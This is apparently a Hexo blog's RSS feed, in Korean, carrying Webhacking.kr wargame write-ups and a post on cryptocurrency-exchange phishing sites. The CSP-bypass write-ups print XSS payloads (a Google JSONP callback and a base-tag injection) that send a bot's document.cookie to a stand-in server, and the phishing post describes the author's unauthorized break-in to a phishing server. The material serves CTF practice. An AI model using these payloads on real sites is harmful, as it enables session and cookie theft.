@@ -1,0 +1,682 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0"
+  xmlns:atom="http://www.w3.org/2005/Atom"
+  xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>JHYEON</title>
+    <link>https://blog.jhyeon.dev/</link>
+    
+    <atom:link href="https://blog.jhyeon.dev/rss2.xml" rel="self" type="application/rss+xml"/>
+    
+    <description>JHYEON BLOG</description>
+    <pubDate>Sun, 11 Jul 2021 01:09:07 GMT</pubDate>
+    <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>Memory Mitigation - Canary</title>
+      <link>https://blog.jhyeon.dev/2021/07/11/memory-mitigation-4/</link>
+      <guid>https://blog.jhyeon.dev/2021/07/11/memory-mitigation-4/</guid>
+      <pubDate>Sun, 11 Jul 2021 01:07:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;Link&quot;&gt;&lt;a href=&quot;#Link&quot; class=&quot;headerlink&quot; title=&quot;Link&quot;&gt;&lt;/a&gt;Link&lt;/h3&gt;&lt;p&gt;해당 포스트는 Notion 문서에 작성되어 있으며, 아래 링크 접속 시 자료를 확인할 수 있답니다~&lt;/p&gt;
+&lt;p</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h3><p>해당 포스트는 Notion 문서에 작성되어 있으며, 아래 링크 접속 시 자료를 확인할 수 있답니다~</p><p><a href="https://www.notion.so/jhyeon/Linux-Memory-Mitigation-Canary-5239b7144d0a41ff8e71bf3e55c3230f">https://www.notion.so/jhyeon/Linux-Memory-Mitigation-Canary-5239b7144d0a41ff8e71bf3e55c3230f</a></p>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Pwnable/">Pwnable</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95/">메모리 보호기법</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Memory-Mitigation/">Memory Mitigation</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Canary/">Canary</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/07/11/memory-mitigation-4/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>WebHacking.kr CHILD Write up</title>
+      <link>https://blog.jhyeon.dev/2021/07/11/webhackingkr-child-0711/</link>
+      <guid>https://blog.jhyeon.dev/2021/07/11/webhackingkr-child-0711/</guid>
+      <pubDate>Sun, 11 Jul 2021 00:40:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;인사말&quot;&gt;&lt;a href=&quot;#인사말&quot; class=&quot;headerlink&quot; title=&quot;인사말&quot;&gt;&lt;/a&gt;인사말&lt;/h3&gt;&lt;p&gt;이번엔 웹케알 새 문제 &lt;code&gt;CHILD&lt;/code&gt; 문제에 대한 풀이에요~ 참고하시어 많은 도움이&lt;/p&gt;
+&lt;p&gt;되</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="인사말"><a href="#인사말" class="headerlink" title="인사말"></a>인사말</h3><p>이번엔 웹케알 새 문제 <code>CHILD</code> 문제에 대한 풀이에요~ 참고하시어 많은 도움이</p><p>되었으면 좋겠습니다 ㅎㅎ.</p><h3 id="분석"><a href="#분석" class="headerlink" title="분석"></a>분석</h3><p><img src="/img/post/webhackingkr_renew/challenge/child/page.png" class="lazyload" data-srcset="/img/post/webhackingkr_renew/challenge/child/page.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>어라. 페이지가 이전 BABY 문제랑 흡사하네요? 이번에도 CSP 문제일까요~</p><p><img src="/img/post/webhackingkr_renew/challenge/child/csp1.png" class="lazyload" data-srcset="/img/post/webhackingkr_renew/challenge/child/csp1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>네 맞습니다. CSP 보안 정책이 적용되어있죠? 그런데 이전 문제랑은 조금 다른 정책이 있습니다.</p><p>script-src 리소스에 대해서 <code>https://*.google.com</code> 에서 오는 도메인은 허용하겠다라는 의미인데요.</p><p>그럼 google 도메인을 가지면서 callback으로 응답을 주는 사이트를 활용하면 되는것인데요</p><p>간단하게 <code>jsonp callback endpoint</code> 이라는 내용으로 검색을 해보시면 금방 알아채실거에요~</p><p>예시 사이트들을 알려드리자면 아래 사이트에 google을 포함한 다른 여러 사이트들의 jsonp callback을 알려주는 문서에요.</p><p><a href="https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt">https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt</a></p><p>허용된 <code>*.google.com</code> 도메인의 <code>jsonp callback</code>을 활용해 XSS를 발생시키고 이전 문제처럼 봇의 쿠키를 탈취하는 문제인데요~~</p><p>저는 <code>https://accounts.google.com/o/oauth2~~</code> 라는 주소를 사용할 거에요.</p><p>그럼 이번엔 페이로드를 어떻게 만들까? BABY 문제처럼 <code>script src</code> 리소스를 불러오는게 없기 때문에</p><p><code>inject</code> 파라미터에 다이렉트로 페이로드를 인젝션해줘야 하는데 <code>script src</code> 리소스를 불러오도록 만들면 되죠?</p><pre><code>`&amp;ltscript+src&amp;gt=&quot;https://accounts.google.com/o/oauth2/revoke?callback=location.href=&#39;https://myserver.com/?flag=&#39;+document.cookie;&quot;&amp;gt&amp;lt/script&amp;gt</code></pre><p>&amp;lt &amp;gt는 각각 &lt; &gt; 을 의미하며 이는.. 블로그 내 게시글 단순 필터링 목적으로 적용하니 참고하여 봐주세요!</p><p>무튼 <code>inject</code> 파라미터에 위 페이로드를 인젝션하게 되면 <code>myserver.com</code> 으로 redirection 이 되는것을 알 수 있어요~</p><p>이 점을 활용해서 report 페이지에 해당 페이로드를 send해서 봇이 사이트에 방문해주도록 만들면?</p><p>플래그 획 ~ 득 ~ 완 ~ 료 !@!</p><p><img src="/img/post/webhackingkr_renew/challenge/child/flag.png" class="lazyload" data-srcset="/img/post/webhackingkr_renew/challenge/child/flag.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Wargame/">Wargame</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/WebHacking-kr/">WebHacking.kr</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/WebHacking/">WebHacking</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Write-up/">Write up</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/CSP/">CSP</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/07/11/webhackingkr-child-0711/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>WebHacking.kr Baby Write up</title>
+      <link>https://blog.jhyeon.dev/2021/07/11/webhackingkr-baby-0710/</link>
+      <guid>https://blog.jhyeon.dev/2021/07/11/webhackingkr-baby-0710/</guid>
+      <pubDate>Sat, 10 Jul 2021 23:24:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;인사말&quot;&gt;&lt;a href=&quot;#인사말&quot; class=&quot;headerlink&quot; title=&quot;인사말&quot;&gt;&lt;/a&gt;인사말&lt;/h3&gt;&lt;p&gt;안녕하세요! 이전에 글을 쓴지 1일쯤 되었나요.. 밤에 잠이 안와서 문제를 풀고&lt;/p&gt;
+&lt;p&gt;롸업을 가져왔습니다 ㅎㅎ </description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="인사말"><a href="#인사말" class="headerlink" title="인사말"></a>인사말</h3><p>안녕하세요! 이전에 글을 쓴지 1일쯤 되었나요.. 밤에 잠이 안와서 문제를 풀고</p><p>롸업을 가져왔습니다 ㅎㅎ 아직 풀이 ing 중인 문제들이 있지만 일부 문제들을 먼저 풀이를 공개하고자 합니다.</p><p>풀이는 참고만 하시되 복붙(ctrl+cv) 하시는 일은 없으셔야 공부가 된답니다~!</p><h3 id="분석"><a href="#분석" class="headerlink" title="분석"></a>분석</h3><pre><code class="html">&lt;h2&gt;you can inject anything&lt;/h2&gt;&lt;div id=injected&gt;foo&lt;/div&gt;&lt;script src=/script.js nonce=MNku599weiFY9SgO43rDJCqmsX0=&gt;&lt;/script&gt;</code></pre><p>우선 BABY 문제 페이지에 들어가보면 페이지 소스코드를 이렇게 볼 수 있습니다.</p><p>별 다른건 없고 아래에 script 리소스를 가져오는걸 보면 <code>/script.js</code> <code>nonce=~~~</code> 로 가져오고 있죠?</p><p>이 부분을 활용해서 문제를 풀이할 수 있습니다!</p><p>우선.. 현재 페이지에 CSP(Content Security Policy)가 적용되어 있을겁니다. 따라오시죠</p><p><img src="/img/post/webhackingkr_renew/challenge/baby/csp1.png" class="lazyload" data-srcset="/img/post/webhackingkr_renew/challenge/baby/csp1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>이렇게 script-src에 대한 CSP 정책을 nonce 값으로 세팅을 해놨는데 허점이 보이시지 않나요?</p><p>바로 URL 뒤에 따라오는 <code>inject=</code> 파라미터입니다.</p><p>그럼 이 파라미터에 입력되는 값은 어떻게 처리될까?</p><p>현재 페이지에 보면 <code>?inject=foo</code> 라고 되어있는데 해당 파라미터 값으로 오는 내용을</p><p>브라우저 화면에 출력시켜주고 있습니다.</p><p>사용자가 입력한 값을 그대로 브라우저에 노출시킨다? XSS 공격에 취약할 수 있죠!</p><p><img src="/img/post/webhackingkr_renew/challenge/baby/csp2.png" class="lazyload" data-srcset="/img/post/webhackingkr_renew/challenge/baby/csp2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img2"></p><p>테스트용 페이로드를 삽입해보면 실제 img 태그가 작동하는 것을 알 수 있어요~</p><p>그럼 여기에 어떤 방법의 인젝션을 해야하느냐?</p><p>바로 <code>base</code> 태그라는 것을 이용하면 됩니다.</p><p>base 태그란?? 해당 문서(페이지)의 모든 상대주소에 대한 기본 URL을 정의하는 것을 의미하는데요.</p><p>예를 들면 현재 페이지에 <code>&amp;ltscript src=/script.js&amp;gt</code> 이런식으로 script 리소스를 불러오죠?</p><p>정상적이라면 <code>http://test.com/script.js</code> 를 의미하고 있겠지만 base 태그를 사용하여</p><p>base URL값을 만들어주면? <code>http://attacker.com/script.js</code> 이런식으로 리소스를 얻어오는 경로를</p><p>조작할 수 있습니다. 즉 <code>attacker.com</code> 도메인에 있는 <code>script.js</code>를 불러오게 되는것이죠~</p><p>그러면 이제 풀이할 방향이 감이 오시나요~?</p><h3 id="풀이"><a href="#풀이" class="headerlink" title="풀이"></a>풀이</h3><p>우선 본인의 서버에다 <code>script.js</code> 파일을 하나 만들고, 그 안에 내용에 <code>alert(1234)</code> 이런식으로 작성해줍니다.</p><p>그리고 다시 문제 페이지로 돌아와서 <code>inject</code> 파라미터에 <code>inject=&amp;ltbase href=&quot;http://attacker.com&quot;&amp;gt</code> 로 만들어줍니다.</p><p>그럼 attacker 서버의 <code>script.js</code> 파일을 읽어오면서 alert 박스가 브라우저에 뜰겁니다.</p><p>이를 활용해 문제 풀이의 목적인 <code>문제 봇 쿠키 탈취</code> 를 해보겠습니다.</p><p>해당 문제는 Chrome Headless를 사용해 일종의 봇이라고 부르는 녀석이 플래그에 대한 값을 가지고 있고, 봇이 가지고 있는 플래그 값을</p><p>얻어내기만 하면 문제는 풀이됩니다. 어떻게 풀까요?</p><p>바로 <code>cookie</code> 값을 얻는겁니다! 대개 이런 봇들은 header 값에 플래그를 가지고 있는 경우도 있지만 cookie 값에 플래그를 세팅해두고</p><p>있는 경우도 있는것이죠. 브라우저에서 쿠키값을 얻으려면 아래 페이로드가 필요합니다.</p><p><code>document.cookie</code> 이 내용을 chrome console에 입력시켜보세요. 본인의 쿠키 정보가 출력될겁니다.</p><p>그럼 이러한 내용을 조합해서 대략 아래 시나리오로 공격을 시도해보겠습니다.</p><p>제보 페이지 -&gt; 페이로드 제출 -&gt; 봇이 서버에 방문 -&gt; 플래그 획득!!</p><p>제보 페이지는 <code>report.php</code>에 있답니다.</p><p><code>script.js</code> 파일 안에 아래와 같은 페이로드를 만들어준 뒤 봇이 서버에 방문해서 스크립트 리소스를 불러오게 되면</p><p>redirection 시켜서 쿠키값을 탈취하는 방식이에요!</p><p>`location.href=”<a href="http://myserver.com/?flag=&quot;+document.cookie">http://myserver.com/?flag=&quot;+document.cookie</a>;</p><p>이렇게 해주면 입력하신 서버로 <code>?flag</code> 파라미터를 통해 봇이 가지고 있는 쿠키가 작성되서 오겠죠?</p><p><img src="/img/post/webhackingkr_renew/challenge/baby/csp3.png" class="lazyload" data-srcset="/img/post/webhackingkr_renew/challenge/baby/csp3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img3"></p><p>문제가 풀이됩니다~~!</p>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Wargame/">Wargame</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/WebHacking-kr/">WebHacking.kr</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/WebHacking/">WebHacking</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Write-up/">Write up</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/07/11/webhackingkr-baby-0710/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Memory Mitigation - NXBIT, DEP</title>
+      <link>https://blog.jhyeon.dev/2021/07/10/memory-mitigation-3/</link>
+      <guid>https://blog.jhyeon.dev/2021/07/10/memory-mitigation-3/</guid>
+      <pubDate>Sat, 10 Jul 2021 13:13:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;Link&quot;&gt;&lt;a href=&quot;#Link&quot; class=&quot;headerlink&quot; title=&quot;Link&quot;&gt;&lt;/a&gt;Link&lt;/h3&gt;&lt;p&gt;아래 링크에 접속하시면 게시글을 보실 수 있습니다!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/img/post/memory</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h3><p>아래 링크에 접속하시면 게시글을 보실 수 있습니다!</p><p><img src="/img/post/memory_mitigation/nxbit.png" class="lazyload" data-srcset="/img/post/memory_mitigation/nxbit.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p><a href="https://www.notion.so/jhyeon/Linux-Memory-Mitigation-Nx-bit-DEP-a8289b5a172a4b7da525d4a9256e9401">바로가기(Notion)</a></p>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Pwnable/">Pwnable</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95/">메모리 보호기법</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Memory-Mitigation/">Memory Mitigation</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/NXBIT/">NXBIT</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/DEP/">DEP</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/07/10/memory-mitigation-3/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>가상화폐 거래소 피싱 사이트 분석에 대해서</title>
+      <link>https://blog.jhyeon.dev/2021/07/10/coinone-phising-0710/</link>
+      <guid>https://blog.jhyeon.dev/2021/07/10/coinone-phising-0710/</guid>
+      <pubDate>Sat, 10 Jul 2021 12:04:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;들어가며&quot;&gt;&lt;a href=&quot;#들어가며&quot; class=&quot;headerlink&quot; title=&quot;들어가며&quot;&gt;&lt;/a&gt;들어가며&lt;/h3&gt;&lt;p&gt;우선. 최근이라고 하면 이상한가(?) 아무튼 올해 초부터 가상화폐에 대한 2030 세대들에서 관심을 많이 갖기 </description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="들어가며"><a href="#들어가며" class="headerlink" title="들어가며"></a>들어가며</h3><p>우선. 최근이라고 하면 이상한가(?) 아무튼 올해 초부터 가상화폐에 대한 2030 세대들에서 관심을 많이 갖기 시작하면서</p><p>국내 3대 거래소라고 불리는 코OO, 빗O, 업OO 등등 유명한 거래소들이 있었죠.</p><p>관심을 많이 가지게 된 계기라고하면 다들 아시다시피 <code>도지코인</code> 가격이 거의 10배가까이 폭등하면서 뉴스에 보도되기도 하고..</p><p>뭐 이러면서 사람들이 자연스레 주식 -&gt; 코인으로 유입되기 시작한 시기였죠 ㅎㅎ</p><p>그만큼 해커 입장에서는 거래소에 어마어마한 거래 자금이 생기니깐 타겟팅을 거래소쪽을 선택을 하겠죠?</p><p>물론 거래소들은 망 분리 등 허술하지 않게 여러 보안 시스템을 잘 구축해놓은지라 거래소를 직접적인 해킹 하는건 불가능에 가깝습니다.</p><p>그럼 해커들은 어디를 노릴까요? 바로 <code>피싱 사이트</code> 입니다.</p><p>피싱 사이트라고 하면은 실제 사이트와 화면을 똑같이 copy해서 만든 사이트입니다. (아래 예시를 보시죠)</p><p><img src="/img/post/coinone_phising/naver.jpeg" class="lazyload" data-srcset="/img/post/coinone_phising/naver.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>또 이번에 분석할 대상 피싱 사이트는 심지어 국내 번호를 대상으로 무작위로 문자를 전송하여 실제 거래소에 해킹이</p><p>발생한 것처럼 꾸며 사이트 접속을 유도하는 식으로 해킹 피해를 발생시켜 왔습니다. 아래 예시 사진과 같습니다.</p><p><img src="/img/post/coinone_phising/coinone.png" class="lazyload" data-srcset="/img/post/coinone_phising/coinone.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>이런식으로 문자가 오고 사이트는 당연히 피싱 사이트입니다. 이제 바로 본론으로 가겠습니다.</p><h3 id="분석-1회차"><a href="#분석-1회차" class="headerlink" title="분석 1회차"></a>분석 1회차</h3><p>저는 비교적 일찍(?) 피싱 사이트에 대한 존재를 알고 사이트들을 분석하였는데요.</p><p>대부분 코OO 거래소의 피싱 사이트였습니다. 왜 다른 거래소들은 없었냐라고 궁금하신 분들이 있으실텐데</p><p>없는 것은 아니였습니다. 다만 빈도수가 극히 드물고 해커 입장에서는 까다로웠겠죠 그 이유를 알아봅시다.</p><p>당시 코OO 거래소에 로그인을 하기 위한 과정은 생각보다 간단했습니다.</p><p><code>계정 입력 -&gt; (선택) OTP 입력 -&gt; 거래소 로그인</code> 과정으로 진행됩니다.</p><p>이 때 OTP(One-Time Password) 방식의 2단계 보안 인증 과정이 있었으나 필수 항목은 아니였습니다.</p><p>즉 사용자가 설정함에 따라 OTP를 사용할 수도 있고, 아닐수도 있는건데요.</p><p>여기서 해커가 쉽게 타인의 계정을 탈취할 수 있었던 이유는 <code>OTP 미사용</code> 유저를 대상으로 한 타겟팅이였습니다.</p><p>OTP를 사용하지 않게 되면 <code>이메일, 비밀번호</code> 만 알아도 거래소에 접근이 가능했기 때문이죠.</p><p>하지만 다른 거래소들의 예시를 보면 업OO 에서는 <code>카카오톡 연동 로그인</code></p><p>빗O 에서는 <code>보안 비밀번호</code> + <code>OTP</code> 방식으로 로그인을 할 수 있도록 이중 보안 잠금 기능이 존재하였는데요.</p><p>이 때문에 해커 입장에서는 비교적 계정 접속이 쉬운 코OO 거래소를 위주로 피싱 사이트를 만들어내기 시작하였습니다.</p><h3 id="분석-2회차"><a href="#분석-2회차" class="headerlink" title="분석 2회차"></a>분석 2회차</h3><p>실제 피싱 사이트의 예시 화면을 보실까요?</p><p><img src="/img/post/coinone_phising/phising.png" class="lazyload" data-srcset="/img/post/coinone_phising/phising.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>위 자료화면은 코OO 거래소 공식사이트에서 가져온 사진입니다. (분석 당시에 했던 사진들을 삭제한 탓에 ㅠ_ㅠ)</p><p>일단 사진을 보면 공식 사이트의 도메인주소랑 다르죠? 공식 사이트는 <code>coinone.co.kr</code> 입니다.</p><p>주소들도 생각보다 다양합니다. coinen** coincn** 등등 공식 사이트 도메인에서 철자만 교묘하게 바꾸면서</p><p>사이트를 옮겨다닙니다. 그리고 언뜻보면 똑같아 보이지만 사이트에 들어가보면 로그인 말고는 다른 기능들이 동작하지 않습니다.</p><p>즉, 로그인 페이지만 copy해서 만들고 나머지 기능들은 구현이 안되어있습니다.</p><p>이런 피싱 사이트에 계정을 입력하게 되면 당연히! <code>코인원</code> 서버가 아닌 <code>해커</code>의 서버로 입력한 정보들이 저장되는 방식인거죠.</p><p><img src="/img/post/coinone_phising/phising2.png" class="lazyload" data-srcset="/img/post/coinone_phising/phising2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>위 사진은 제가 <code>COINDB</code> 라는 사이트에서 백엔드를 담당하여 개발을 진행하면서 수집하였던 피싱 사이트의</p><p>일부 정보인데요. 보시면은 도메인이 제 각각 모두 다른 구조를 띄고 있습니다.</p><p><img src="/img/post/coinone_phising/phising3.png" class="lazyload" data-srcset="/img/post/coinone_phising/phising3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>또한 실제 서버가 운영되고 있는 서버IP 주소를 보면 103<del>, 45</del> 로 시작하는데 정확한 위치를 트래킹할 수는 없었지만</p><p>대부분 중국에서 운영되고 있었습니다. VPN로 경로를 우회한건진 정확하게 알 수 없었으나 이후에 나올 맛보기(?)에서</p><p>중국임을 확신할 수 있었습니다.</p><h3 id="분석-3회차"><a href="#분석-3회차" class="headerlink" title="분석 3회차"></a>분석 3회차</h3><p>제가 해당 사이트를 분석했을 당시에는 아래와 같은 방식으로 데이터를 저장하고 있었습니다.</p><p>예시 사진들을 첨부하면서 설명드리고 싶으나 당시 관련 사진들은 모두 삭제했기에 기억을 짚어서 글을 쓰겠습니다 ㅎㅎ..</p><p>우선 사용자가 계정을 입력하고 로그인 버튼을 누르면 <code>data.php</code>로 입력한 데이터들을 <code>ajax</code>를 사용하여 가공을 해서</p><p>데이터를 넘겨주게 됩니다. 이후 <code>data.php</code> 라는 파일에서는 넘어온 데이터들을 DB로 저장시키는 방법을 쓰고 있었겠죠?</p><p>이 때 생각난것이 관리자 페이지가 존재하지 않을까? 라고 생각했고 directory fuzzing을 통해서 관리자 페이지의 URL을</p><p>획득했습니다. 주소는 매우 간단했습니다 guessing으로도 찾을 수 있었고 <code>/admin/index.php</code> 이라는 path에 관리자 페이지가</p><p>존재하고 있었습니다. 이런 피싱 사이트들은 보안에 매우 취약하고 사이트를 구축하는데 돈 한푼 들이지 않습니다.</p><p>그말인 즉슨 취약점이 매우 많다는 의미로도 해석되겠지요. 여기서 잠깐 맛보기로 말씀드리면 당시 DB 엔진으로 어떤걸 쓸까 하면서</p><p>생각하던 찰나에 비교적 접근성, 구축이 쉬운 <code>MySQL</code> 데이터베이스를 쓸 것이라고 생각했습니다. 그 예상은 적중을 했구요.</p><p>그래서 저는 여기서 한 단계 더 접근해서 사이트의 보안 취약점을 이용해 권한 상승, Exploitation에 성공하면서</p><p>내부 서버로 침투가 가능했습니다. 즉 DB 데이터도 모두 열람이 가능하였단 의미입니다. 사실 이 방법은 인가되지 않은 접근이기 때문에</p><p>이 글을 보시고 함부로 아무 사이트에서 공격을 테스팅하시거나 그러시면 철컹철컹 당합니다. 절대 호기심에 따라하지 마세요~!</p><p>아래 사진은 해당 피싱 사이트의 DB 데이터 중 일부 정보가 포함된 예시 사진입니다.</p><p><img src="/img/post/coinone_phising/phising4.jpeg" class="lazyload" data-srcset="/img/post/coinone_phising/phising4.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="정리"><a href="#정리" class="headerlink" title="정리"></a>정리</h3><p>현재에도 피싱 사이트들이 많이 존재하고 있습니다. 물론 이렇게 알려져도 피싱 사이트인줄 인지하지 못하시고</p><p>거기서 로그인을 하시는 경우가 많은데요. 본인의 소중한 자산을 지키기 위해서는 <code>보안</code> 필수입니다.</p><p>항상 경각심을 가지시길 바란다는 마음에서 예전 경험을 좀 작성해봤네요.</p><p>요즘에는 거래소에서도 자체적으로 <code>카카오톡 로그인 알림</code> 등을 적용하여 인가되지 않은 사용자의 접근이 발생할 경우</p><p>즉시 접속, 거래 차단이 가능한 방법을 적용하고 있어 빈도수가 많이 줄어든 편이라고 생각을 하나 그래도 여전히</p><p>많이 발생하고 있습니다. 앞으로도 보안 관련 피해가 발생하지 않길 바라고 피싱은 좀 근절되었으면 좋겠네요.</p><p>당연하겠지만 관련 데이터들은 <code>코OO</code> 거래소를 통해 정보들을 모두 넘겨드린 상태입니다 <del>_</del></p><p>우리 모두 보안에 경각심을 가지고 해킹으로 부터 안전한 환경을 만들어요! 그럼 Goodbye~</p>]]></content:encoded>
+      
+      
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/07/10/coinone-phising-0710/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Webhacking.kr 새로운 문제들이 공개되었네요!</title>
+      <link>https://blog.jhyeon.dev/2021/07/10/webhackingkr-renew-0710/</link>
+      <guid>https://blog.jhyeon.dev/2021/07/10/webhackingkr-renew-0710/</guid>
